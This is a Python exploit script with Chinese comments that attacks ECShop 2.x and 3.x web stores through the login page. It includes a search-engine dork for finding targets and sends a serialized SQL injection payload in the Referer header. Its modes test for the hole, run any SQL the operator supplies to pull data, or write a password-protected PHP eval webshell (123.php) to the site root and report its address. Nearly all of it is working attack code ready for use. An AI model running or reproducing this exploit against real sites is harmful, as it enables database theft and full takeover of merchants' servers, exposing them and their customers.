#!/usr/bin/env python
# author:Xiaogang
# Help: Ecshop 2.x/3.x SQL注入和代码执行漏洞
# inurl:"/user.php?act=login"

import requests
import sys
import re
import base64
import time


def test(url):
    target = url.strip() + "/user.php?act=login"
    payload = {
        '2_sql': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:3:"669";s:2:"id";s:57:"1\' and updatexml(1,make_set(3,\'~\',(select version())),1)#";}554fcae493e564ee0dc75bdf2ebf94ca',
        '2_phpinfo': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"\' /*";}554fcae493e564ee0dc75bdf2ebf94ca',
        '3_phpinfo': '45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'
    }
    for i in payload:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': payload[i]
        }
        response = requests.request("GET", target, headers=headers)
        if response:
            data = response.text
            if "XPATH syntax error" in data:
                pattern = "XPATH syntax error: '~,(.*)'\n"
                data = re.search(pattern, data).group(0)
                data = data.lstrip("XPATH syntax error: '~,").rstrip("'\n")
                print(i,'执行成功')
                print(data)
                print("###################################")
            elif "PHP Version" in data:
                print(i,"执行成功")
                print("###################################")
            else:
                print(i,'执行失败')
                print("###################################")
        else:
            print('可能无响应')


def sql_attack(url,sql):
    target = url.strip() + "/user.php?act=login"
    sql_len = len(sql)
    ser_len = (57 - 16 + sql_len)
    sql = 's:3:"num";s:3:"669";s:2:"id";s:{}:"1\' and updatexml(1,make_set(3,\'~\',({})),1)#";'.format(ser_len,sql)
    payload = '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{'+sql+'}554fcae493e564ee0dc75bdf2ebf94ca'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': payload,
    }
    response = requests.request("GET", target, headers=headers)
    if response:
        data = response.text
        if "XPATH syntax error" in data:
            pattern = "XPATH syntax error: '~,(.*)'\n"
            data = re.search(pattern, data).group(0)
            data = data.lstrip("XPATH syntax error: '~,").rstrip("'\n")
            print('执行成功')
            print(data)
            print("###################################")
        else:
            print('执行失败')
            print("###################################")
    else:
        print('可能无响应')

def shell2_attack(url,password):
    target = url.strip() + "/user.php?act=login"

    shell_pass = "file_put_contents('123.php','<?php eval($_POST[{}]); ?>')".format(password)
    shell_pass = shell_pass.encode(encoding="utf-8")
    shell_pass_base64 = base64.b64encode(shell_pass).decode()
    sql_shell = "{$asd'];assert(base64_decode('"+shell_pass_base64+"'));//}xxx"
    sql_hex = str_to_hex(sql_shell)
    sql_len = len("*/ union select 1,0x272f2a,3,4,5,6,7,8,0x{},10-- -".format(sql_hex))
    sql = 's:3:"num";s:{}:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x{},10-- -";s:2:"id";s:3:"\'/*";'.format(sql_len,sql_hex)
    payload = '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{'+sql+'}554fcae493e564ee0dc75bdf2ebf94ca'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': payload
    }

    try:
        response = requests.request("GET", target, headers=headers)
        webshell_url = url.strip() + "/123.php"
        time.sleep(3)
        n = requests.get(webshell_url)
        if n.status_code == 200:
            print("shell地址是:{} ,密码是{}".format(webshell_url,password))
        else:
            print("不存在漏洞")
    except Exception:
        print("不存在漏洞")

def shell3_attack(url,password):
    target = url.strip() + "/user.php?act=login"

    shell_pass = "file_put_contents('123.php','<?php eval($_POST[{}]); ?>')".format(password)
    shell_pass = shell_pass.encode(encoding="utf-8")
    shell_pass_base64 = base64.b64encode(shell_pass).decode()
    sql_shell = "{$asd'];assert(base64_decode('"+shell_pass_base64+"'));//}xxx"
    sql_hex = str_to_hex(sql_shell)
    sql_len = len("*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x{},10-- -".format(sql_hex))
    sql = 's:3:"num";s:{}:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x{},10-- -";s:2:"id";s:11:"-1\' UNION/*";'.format(sql_len,sql_hex)
    payload = '45ea207d7a2b68c49582d2d22adf953aads|a:2:{'+sql+'}45ea207d7a2b68c49582d2d22adf953a'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': payload
    }

    try:
        response = requests.request("GET", target, headers=headers)
        webshell_url = url.strip() + "/123.php"
        time.sleep(5)
        n = requests.request("GET", webshell_url)
        if n.status_code == 200:
            print("shell地址是:{} ,密码是{}".format(webshell_url,password))
        else:
            print("不存在漏洞")
    except Exception:
        print("不存在漏洞")

def str_to_hex(s):
    return "".join([hex(ord(c)).replace('0x', '') for c in s])

def main():
    args = sys.argv
    if len(args) == 4:
        if args[2] == '-sql':
            url = args[1]
            sql = args[3]
            sql_attack(url,sql)
        elif args[2] == '-shell2':
            url = args[1]
            password = args[3]
            shell2_attack(url,password)
        elif args[2] == '-shell3':
            url = args[1]
            password = args[3]
            shell3_attack(url,password)
        else:
            print('参数错误')
    elif len(args) == 2:
        url = args[1]
        test(url)
    else:
        print('检测ECshop2和3版本的sql注入和phpinfo代码执行')
        print("Usage: python {} url地址 ".format(args[0]))
        print("Usage: python {} url地址 [-sql sql语句]".format(args[0]))
        print("Usage: python {} http://www.xxx.com -sql select+database()".format(args[0]))
        print('2版本在根目录生成123.php的webshell')
        print("Usage: python {} url地址 [-shell2 password]".format(args[0]))
        print('3版本在根目录生成123.php的webshell')
        print("Usage: python {} url地址 [-shell3 password]".format(args[0]))



if __name__ == '__main__':
    main()